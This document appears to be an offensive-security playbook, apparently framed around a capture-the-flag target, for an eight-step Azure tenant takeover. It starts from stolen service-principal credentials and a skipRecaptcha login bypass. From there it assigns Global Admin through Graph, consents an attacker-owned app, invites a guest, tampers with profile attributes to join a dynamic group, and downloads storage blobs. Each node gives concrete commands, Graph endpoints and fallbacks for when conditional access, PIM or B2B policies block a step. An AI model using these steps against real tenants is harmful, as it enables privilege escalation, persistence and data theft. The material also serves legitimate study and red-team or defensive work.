# Chain: Azure Multi-Tenant SP Auth → Global Admin → OAuth Consent → Graph Token → Guest Invite → Dynamic Group → Blob Exfil
Tags: azure, multi-tenant, service-principal, global-admin, oauth, graph-api, guest-invite, dynamic-group, blob-exfil, conditional-access-bypass, skipRecaptcha
Chain Severity: High
Entry Condition: Multi-tenant Azure Service Principal credentials (clientId + clientSecret + tenantId) obtained; target tenant allows multi-tenant SP auth; web application with `skipRecaptcha` parameter or similar bypass

## Node 1 — Multi-Tenant SP Authentication
Technique: [[Cloud/Azure_Attacks#Multi-Tenant Service Principal Authentication]]
Strike Vector: "service principal auth with client credentials flow"
Condition: Valid SP `clientId`, `clientSecret`, `tenantId`; SP registered in target tenant (multi-tenant app or explicitly granted)
Standalone Severity: Low
Branches:
  - `az login --service-principal -u <clientId> -p <clientSecret> --tenant <tenantId>` succeeds → ARM token obtained → Node 2
  - SP not consented in target tenant → attempt admin consent URL flow or check if SP auto-provisioned on first login
  - Credentials expired → rotate secret via SP owner account if available; check for additional secrets in keyvault or environment

## Node 2 — Web Application Bypass (skipRecaptcha / Logic Flaw)
Technique: [[Cloud/Azure_Attacks#Web Application Authentication Logic Bypass]]
Strike Vector: "skipRecaptcha parameter or logic bypass in registration/login flow"
Condition: Web application fronts an Azure-backed service; undocumented parameter or weak server-side validation bypasses authentication gate
Standalone Severity: Med
Branches:
  - Adding `skipRecaptcha=true` (or equivalent hidden param) to registration/login POST bypasses auth gate → authenticated session obtained → Node 3
  - No such parameter → probe for other bypass conditions: missing CSRF token validation, debug endpoints, magic tokens in source HTML/JS
  - Bypass blocked server-side → try SP token directly on Microsoft Graph / ARM APIs without web app intermediary

## Node 3 — Global Admin Role Assignment
Technique: [[Cloud/Azure_Attacks#Global Administrator Role Assignment via Graph API]]
Strike Vector: "graph API role assignment to attacker-controlled account"
Condition: SP or authenticated session has `RoleManagement.ReadWrite.Directory` or equivalent; Global Admin role definition ID known (`62e90394-69f5-4237-9190-012177145e10`)
Standalone Severity: High
Branches:
  - POST to `/v1.0/roleManagement/directory/roleAssignments` assigns Global Admin to attacker account → Node 4
  - Permission denied → check if SP has `Directory.ReadWrite.All`; try assigning a lesser privileged role (User Administrator) as stepping stone
  - Role assignment blocked by Privileged Identity Management (PIM) → look for active PIM assignments; check if SP has PIM-eligible role that can be self-activated

## Node 4 — OAuth Admin Consent Grant
Technique: [[Cloud/Azure_Attacks#OAuth Admin Consent for Application Permissions]]
Strike Vector: "admin consent grant via /adminconsent endpoint"
Condition: Global Admin privileges; attacker-controlled multi-tenant application registered in attacker's tenant with required permissions (`User.Read.All`, `GroupMember.ReadWrite.All`, `User.Invite.All`)
Standalone Severity: High
Branches:
  - Navigate to `https://login.microsoftonline.com/<target-tenant>/adminconsent?client_id=<attacker-app-id>` while authenticated as Global Admin → consent granted → Node 5
  - Consent UI blocked by conditional access → use `az rest` or Graph API to grant consent programmatically (`POST /v1.0/oauth2PermissionGrants`)
  - Application not found in target tenant → trigger auto-provisioning via auth code flow first

## Node 5 — Graph API Token Acquisition
Technique: [[Cloud/Azure_Attacks#Microsoft Graph API Token via Client Credentials]]
Strike Vector: "client credentials flow for Graph API token"
Condition: Admin consent granted in Node 4; attacker app has `client_credentials` grant; target tenant ID known
Standalone Severity: Med
Branches:
  - POST to `https://login.microsoftonline.com/<target-tenantId>/oauth2/v2.0/token` with attacker app creds → Graph API bearer token obtained → Node 6
  - Token scope insufficient → verify consented permissions match requested scope; re-request with correct `scope` parameter
  - MFA or CA policy blocks token issuance → app-only permissions via client credentials are not subject to user MFA — confirm `client_credentials` flow used

## Node 6 — Group Enumeration + Guest Invite (User.Invite.All)
Technique: [[Cloud/Azure_Attacks#Guest User Invitation via Graph API]]
Strike Vector: "graph API group enum and guest invite"
Condition: Graph token with `User.Invite.All` + `Group.Read.All`; target group(s) with dynamic membership rules visible
Standalone Severity: High
Branches:
  - `GET /v1.0/groups?$filter=groupType eq 'DynamicMembership'` reveals dynamic groups → check membership rules → Node 7
  - `POST /v1.0/invitations` with attacker email → guest invite accepted → attacker account provisioned in tenant → Node 7
  - Invite blocked by B2B policy → check `externalCollaborationSettings`; try inviting from Global Admin account directly

## Node 7 — Dynamic Group Join + SP Metadata URL → Blob Exfil
Technique: [[Cloud/Azure_Attacks#Dynamic Group Membership via Profile Attribute Manipulation]]
Strike Vector: "dynamic group membership rule exploitation for blob access"
Condition: Dynamic group membership rule known (e.g., `user.companyName -eq "Partner"`); attacker guest account's profile attribute modifiable via Graph API; group has storage/blob access
Standalone Severity: High
Branches:
  - PATCH `/v1.0/users/<attacker-guest-id>` sets profile attribute matching dynamic rule → group membership auto-assigned within minutes → Node 8
  - Group membership rule uses non-modifiable attribute (e.g., `user.userType`, `user.assignedLicenses`) → enumerate other dynamic groups for weaker rules
  - SP metadata URL embedded in group description or app registration → yields storage account URL, SAS token, or managed identity endpoint

## Node 8 — Azure Blob Storage Exfiltration
Technique: [[Cloud/Azure_Attacks#Blob Storage Exfiltration via Group-Granted Access]]
Strike Vector: "blob storage read via dynamic group membership"
Condition: Group membership grants access to storage account (via RBAC `Storage Blob Data Reader` or shared SAS); container and blob names known or enumerable
Standalone Severity: High
Branches:
  - `az storage blob download --account-name <acct> --container-name <container> --name flag --file /tmp/flag` → flag retrieved → [TERMINAL] Chain Complete (High)
  - Access requires specific storage endpoint discovered from SP metadata → use metadata URL for storage account name
  - SAS token from group resource → `curl "https://<account>.blob.core.windows.net/<container>/flag?<SAS>"` → flag content
  - Blob access denied despite group membership → RBAC propagation delay (up to 5 min); retry after wait
